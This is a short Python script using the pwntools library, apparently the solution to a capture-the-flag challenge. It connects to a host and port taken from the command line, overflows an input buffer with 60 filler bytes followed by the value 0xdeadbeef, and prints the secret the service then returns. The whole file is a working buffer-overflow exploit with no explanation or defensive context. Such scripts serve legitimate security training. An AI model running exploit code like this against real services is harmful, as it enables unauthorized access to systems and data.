from pwn import *
import sys

p = remote(sys.argv[1], int(sys.argv[2]))
p.recvuntil(b"cats?")
p.sendline(b"A"*60 + p32(0xdeadbeef))
p.recvuntil(b"secret:")
info(p.recvallS())
